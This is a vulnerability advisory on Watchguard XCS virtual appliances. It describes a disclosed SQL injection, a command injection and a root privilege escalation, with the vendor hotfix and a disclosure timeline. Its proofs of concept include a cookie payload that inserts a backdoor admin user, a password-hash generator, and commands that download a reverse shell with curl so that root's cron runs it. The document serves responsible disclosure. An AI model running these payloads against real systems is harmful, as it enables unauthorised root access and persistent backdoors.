@@ -1,0 +1,134 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Watchguard XCS Multiple Vulnerabilities
+Affected versions: Watchguard XCS <=10.0
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf
+
++-----------+
+|Description|
++-----------+
+The Watchguard XCS virtual appliance contains a number of
+vulnerabilities, including unauthenticated SQL injection, command
+execution and privilege escalation. By combining these vulnerabilities,
+an attacker may remotely obtain root privileges on the underlying host.
+
++------------+
+|Exploitation|
++------------+
+==SQL Injection==
+Unauthenticated SQL injection is possible through the “sid” cookie
+parameter in the Watchguard XCS web interface due to a PHP script that
+insecurely constructs an SQL query using that value. Stacked queries are
+possible, and allow insertion of a backdoor web interface user into the
+database. The following POC shows the insertion of a backdoor user, and
+a python snippet that can be used to construct the Watchguard XCS
+specific password hashes.
+
+[SQLi POC]
+GET /borderpost/imp/compose.php3 HTTP/1.1
+Host: [HOST]
+Cookie: sid=1%3BINSERT INTO sds_users (self, login, password, org,
+priv_level, quota, disk_usage) VALUES(99, 'backdoor',
+'0b75e2443d3c813d91ac5b91106a70ad', 0, 'server_admin', 0, 0)--
+
+
+[Python Password Hash Generator]
+import hashlib
+def gen_hash(pass_clear):
+  PRE_SALT = "BorderWare "
+  POST_SALT = " some other random (9) stuff"
+  t1 = hashlib.md5(PRE_SALT + pass_clear + POST_SALT).hexdigest()
+  t2 = hashlib.md5(pass_clear + t1).hexdigest()
+  return t2
+  
+print gen_hash("backdoor")
+
+
+==Command Injection==
+The web interface of XCS contains a command injection vulnerability,
+allowing an authenticated web application user to execute system
+commands as the "nobody" user. The vulnerability is in the id parameter
+of the "mailqueue.spl" page.
+[POC]
+GET /ADMIN/mailqueue.spl?f=dnld&id=;id;uname%20-a
+Host: [HOST]
+Cookie: [VALID COOKIE]
+
+
+==Privilege Escalation==
+Privilege Escalation
+There are multiple methods to escalate privileges to root after
+obtaining a shell. The "FixCorruptMail" script exploit is shown below,
+an additional method is detailed in the accompanying PDF.  Privilege
+escalation is possible by exploiting the /usr/local/bin/FixCorruptMail
+script when it is called by root's crontab every three minutes. This
+script reads a file “badqids” from the /var/tmp directory, and
+constructs a shell command using some of the contents.
+
+[POC]
+touch /tmp/dummyfile
+/usr/local/sbin/curl -s http://[REVERSE_SHELL.elf] -o /tmp/revshell
+chmod +x /tmp/revshell
+echo "../../../../../../tmp/dummyfile;/tmp/revshell" > /var/tmp/badqids
+
+The executable "/tmp/revshell" will be executed within three minutes by
+the root user.
+
++----------+
+| Solution |
++----------+
+Apply the relevant XCS security hotfix (Build 150522) as provided by
+Watchguard.
+
++-------------------+
+|Disclosure Timeline|
++-------------------+
+12/05/2015 - Email sent to confirm vendor security contact address is valid.
+13/05/2015 - Response from vendor confirming address is valid.
+13/05/2015 - Sent advisory through to vendor.
+13/05/2015 - Vendor confirms receipt of advisory.
+27/05/2015 - Vendor sends update on fixes, states a release will be
+published shortly.
+09/06/2015 - Security hotfixes released for Watchguard XCS v10.0 and v9.2.
+29/06/2015 - Public advisory release.
+
++-----------------------------+
+|About Security-Assessment.com|
++-----------------------------+
+
+Security-Assessment.com is Australasia's leading team of Information
+Security consultants specialising in providing high quality Information
+Security services to clients throughout the Asia Pacific region. Our
+clients include some of the largest globally recognised companies in
+areas such as finance, telecommunications, broadcasting, legal and
+government. Our aim is to provide the very best independent advice and a
+high level of technical expertise while creating long and lasting
+professional relationships with our clients.
+
+Security-Assessment.com is committed to security research and
+development, and its team continues to identify and responsibly publish
+vulnerabilities in public and private software vendor's products.
+Members of the Security-Assessment.com R&D team are globally recognised
+through their release of whitepapers and presentations related to new
+security research.
+
+For further information on this issue or any of our service offerings,
+contact us:
+Web www.security-assessment.com
+Email info () security-assessment.com
+Phone +64 4 470 1650
